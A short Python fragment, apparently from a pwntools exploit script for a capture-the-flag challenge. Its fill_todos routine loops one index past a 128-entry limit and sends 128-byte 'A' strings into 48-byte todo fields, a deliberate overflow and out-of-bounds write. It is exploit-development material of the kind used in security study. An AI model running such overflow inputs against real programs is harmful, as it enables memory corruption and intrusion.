
TODO_COUNT=128
TODO_LENGTH=48



def fill_todos():
    for i in range(0, TODO_COUNT+1):
        p.sendline('3')
        p.sendline(str(i))
        p.sendline('A'*128)


